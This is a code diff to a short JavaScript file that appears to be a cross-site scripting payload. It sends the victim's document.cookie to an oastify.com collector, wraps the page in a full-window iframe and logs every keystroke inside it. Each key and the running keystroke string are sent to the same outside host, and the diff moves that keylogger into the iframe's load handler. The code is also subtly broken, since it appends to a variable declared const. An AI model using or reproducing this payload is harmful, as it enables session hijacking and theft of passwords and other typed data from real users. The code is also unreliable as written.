@@ -1,3 +1,4 @@
+const currSession="";
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com${document.cookie}`);
 setTimeout(function() {}, 3000);
 document.body.style.setProperty('height', '100vh')
@@ -8,11 +9,10 @@ iframe.height = '100%';
 iframe.style.border = 'none';
 iframe.onload = function () {
     console.log('Iframe has loaded successfully!');
-};
-document.body.appendChild(iframe);
-const currSession="";
-iframe.contentWindow.addEventListener('keydown', (event) => {    console.log(`Key pressed: ${event.key}`);
+    iframe.contentWindow.addEventListener('keydown', (event) => {    console.log(`Key pressed: ${event.key}`);
     fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com${event.key}`);
     currSession += String(event.key)
     fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com${currSession}`);
 });
+};
+document.body.appendChild(iframe);
